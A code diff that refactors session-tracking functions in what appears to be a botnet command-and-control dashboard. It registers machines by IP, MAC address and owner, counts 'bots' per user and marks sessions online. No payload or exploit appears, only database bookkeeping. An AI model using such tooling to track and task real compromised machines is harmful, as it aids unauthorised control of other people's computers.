@@ -33,25 +33,6 @@ except NameError:
 #####################
 # Dashboard functions
 
-def get_sessions_new(user_id):
-    """
-    Get new sessions and update 'new' to False.
-
-    `Required`
-    :param int user_id:     User ID
-    """
-    user = User.query.get(user_id)
-    new_sessions = []
-    if user:
-        sessions = user.sessions
-        for s in sessions:
-            if s.new:
-                s.new = False
-                new_sessions.append(s)
-    db.session.commit()
-    return new_sessions
-
-
 def get_sessions(user_id, verbose=False):
     """
     Fetch sessions from database
@@ -69,6 +50,24 @@ def get_sessions(user_id, verbose=False):
         return user.sessions
     return []
 
+
+def get_sessions_new(user_id):
+    """
+    Get new sessions and update 'new' to False.
+
+    `Required`
+    :param int user_id:     User ID
+    """
+    user = User.query.get(user_id)
+    new_sessions = []
+    if user:
+        sessions = user.sessions
+        for s in sessions:
+            if s.new:
+                s.new = False
+                new_sessions.append(s)
+    db.session.commit()
+    return new_sessions
 
 def get_tasks(session_uid):
     """
@@ -192,43 +191,49 @@ def handle_session(session_dict):
     Returns the session information as a dictionary.
     """
     if not session_dict.get('uid'):
+        # use unique hash of session characteristics to identify machine if possible
         identity = str(session_dict['public_ip'] + session_dict['mac_address'] + session_dict['owner']).encode()
         session_dict['uid'] = hashlib.md5(identity).hexdigest()
         session_dict['joined'] = datetime.utcnow()
 
+    # udpdate session status to online
     session_dict['online'] = 1
     session_dict['last_online'] = datetime.utcnow()
 
+    # check if session metadata already exists in database
     session = Session.query.filter_by(uid=session_dict['uid']).first()
 
+    # if session for this machine not found, assign this machine to the listed owner 
     if not session:
-        # get new session id
         user = User.query.filter_by(username=session_dict['owner']).first()
         if user:
             sessions = user.sessions
+
+            # increment session id if necessary (TODO: db autoincrement?)
             if sessions:
                 session_dict['id'] = 1 + max([s.id for s in sessions])
             else:
                 session_dict['id'] = 1
 
-            # add new session
             session = Session(**session_dict)
             db.session.add(session)
-
-            # update number of bots
             user.bots += 1
+            db.session.commit()
+
         else:
+            # if user doesn't exist don't add anything
             util.log("User not found: " + session_dict['owner'])
     else:
-        # set session status to online
+        # if session metadata found, set session status to online
         session.online = True
         session.last_online = datetime.utcnow()
+        db.session.commit()
 
-    session.new = True
+    if session:
+        session.new = True
+        session_dict['id'] = session.id
+        db.session.commit()
 
-    db.session.commit()
-
-    session_dict['id'] = session.id
     return session_dict
 
 
@@ -280,4 +285,3 @@ def update_session_status(session_uid, status):
     if session:
         session.online = bool(status)
         db.session.commit()
-
